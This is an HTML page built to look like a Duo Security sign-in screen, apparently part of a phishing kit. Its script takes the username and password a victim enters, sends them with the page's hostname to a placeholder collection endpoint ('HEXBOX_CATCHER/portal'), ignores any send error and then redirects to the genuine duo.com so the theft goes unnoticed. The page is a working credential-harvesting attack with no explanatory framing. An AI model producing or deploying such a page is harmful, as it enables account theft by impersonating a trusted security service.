<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Duo Security</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#1b1b1b;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
.card{background:#242424;width:100%;max-width:380px;border-radius:6px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.5)}
.card-header{padding:28px 32px 20px;border-bottom:1px solid #2e2e2e;display:flex;align-items:center;gap:10px}
.duo-logo{font-size:22px;font-weight:700;color:#6ac432;letter-spacing:1px}
.duo-logo span{color:#fff}
.card-body{padding:28px 32px 32px}
.card-body h2{font-size:17px;color:#e0e0e0;font-weight:500;margin-bottom:24px}
.field-wrap{margin-bottom:18px}
.field-wrap label{display:block;font-size:12px;font-weight:600;color:#aaa;margin-bottom:6px;text-transform:uppercase;letter-spacing:.6px}
.field-wrap input{width:100%;padding:10px 14px;font-size:14px;background:#1b1b1b;border:1px solid #3a3a3a;border-radius:4px;color:#e0e0e0;outline:none;transition:border .15s,box-shadow .15s}
.field-wrap input::placeholder{color:#555}
.field-wrap input:focus{border-color:#6ac432;box-shadow:0 0 0 2px rgba(106,196,50,.15)}
.error-msg{display:none;color:#e05252;font-size:12px;margin-top:5px}
.error-msg.show{display:block}
.btn-login{width:100%;padding:11px;background:#6ac432;color:#fff;font-size:14px;font-weight:700;border:none;border-radius:4px;cursor:pointer;margin-top:8px;letter-spacing:.3px;transition:background .15s}
.btn-login:hover{background:#5ab228}
.footer-note{margin-top:20px;text-align:center;font-size:11px;color:#555}
</style>
</head>
<body>

<div class="card">
  <div class="card-header">
    <div class="duo-logo">Duo <span>Security</span></div>
  </div>
  <div class="card-body">
    <h2>Sign in to your account</h2>

    <form id="loginForm" action="HEXBOX_CATCHER/portal" method="POST" novalidate>
      <input type="hidden" name="portal" value="duo">

      <div class="field-wrap">
        <label for="username">Username</label>
        <input type="text" id="username" name="username" autocomplete="username"
               autocorrect="off" autocapitalize="off" spellcheck="false"
               placeholder="username@company.com" required>
        <div class="error-msg" id="userErr">Please enter your username.</div>
      </div>

      <div class="field-wrap">
        <label for="password">Password</label>
        <input type="password" id="password" name="password"
               autocomplete="current-password" placeholder="••••••••" required>
        <div class="error-msg" id="passErr">Please enter your password.</div>
      </div>

      <button type="submit" class="btn-login">Log In</button>
    </form>

    <div class="footer-note">Protected by Duo Security two-factor authentication</div>
  </div>
</div>

<script>
(function(){
  var form = document.getElementById('loginForm');
  var userErr = document.getElementById('userErr');
  var passErr = document.getElementById('passErr');

  form.addEventListener('submit', function(e){
    e.preventDefault();
    var username = document.getElementById('username').value.trim();
    var password = document.getElementById('password').value;
    var valid = true;

    if(!username){ userErr.classList.add('show'); valid=false; }
    else { userErr.classList.remove('show'); }
    if(!password){ passErr.classList.add('show'); valid=false; }
    else { passErr.classList.remove('show'); }
    if(!valid) return;

    var payload = {
      username: username,
      password: password,
      portal: 'duo',
      host: window.location.hostname
    };

    fetch('HEXBOX_CATCHER/portal', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify(payload),
      credentials: 'omit'
    }).catch(function(){})
      .finally(function(){
        window.location.href = 'https://duo.com';
      });
  });
})();
</script>
</body>
</html>
